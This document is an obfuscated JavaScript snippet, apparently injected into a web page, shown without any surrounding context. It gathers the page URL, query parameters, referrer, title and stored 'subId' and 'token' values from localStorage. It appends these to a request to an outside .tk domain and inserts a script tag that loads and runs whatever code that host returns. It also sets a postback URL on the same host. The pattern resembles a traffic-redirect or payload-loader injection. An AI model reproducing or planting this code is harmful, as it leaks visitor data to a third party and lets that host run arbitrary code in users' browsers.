  (function() {
    var name = '_tLJvDtffNBRJgSYV';
    if (!window._tLJvDtffNBRJgSYV) {
        window._tLJvDtffNBRJgSYV = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://teplodistedeli.tk/fitshow',
            P_PATH: 'https://teplodistedeli.tk/fec84ce/postback',
        };
    }
    const _qXxGCTybJCcZWtCt = localStorage.getItem('config');
    if (typeof _qXxGCTybJCcZWtCt !== 'undefined' && _qXxGCTybJCcZWtCt !== null) {
        var _9QP1wKKS9mwttgSD = JSON.parse(_qXxGCTybJCcZWtCt);
        var _FSwWqHSytjDYt1Bc = Math.round(+new Date()/1000);
        if (_9QP1wKKS9mwttgSD.created_at + window._tLJvDtffNBRJgSYV.ttl < _FSwWqHSytjDYt1Bc) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _tdDCzcYbK8fxX7Mp = localStorage.getItem('subId');
    var _S2MT24QNPDVHkQgm = localStorage.getItem('token');
    var _25hszvB2BRw8vRCy = '?return=js.client';
        _25hszvB2BRw8vRCy += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _25hszvB2BRw8vRCy += '&se_referrer=' + encodeURIComponent(document.referrer);
        _25hszvB2BRw8vRCy += '&default_keyword=' + encodeURIComponent(document.title);
        _25hszvB2BRw8vRCy += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _25hszvB2BRw8vRCy += '&name=' + encodeURIComponent(name);
        _25hszvB2BRw8vRCy += '&host=' + encodeURIComponent(window._tLJvDtffNBRJgSYV.R_PATH);
    if (typeof _tdDCzcYbK8fxX7Mp !== 'undefined' && _tdDCzcYbK8fxX7Mp && window._tLJvDtffNBRJgSYV.unique) {
        _25hszvB2BRw8vRCy += '&sub_id=' + encodeURIComponent(_tdDCzcYbK8fxX7Mp);
    }
    if (typeof _S2MT24QNPDVHkQgm !== 'undefined' && _S2MT24QNPDVHkQgm && window._tLJvDtffNBRJgSYV.unique) {
        _25hszvB2BRw8vRCy += '&token=' + encodeURIComponent(_S2MT24QNPDVHkQgm);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._tLJvDtffNBRJgSYV.R_PATH + _25hszvB2BRw8vRCy;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
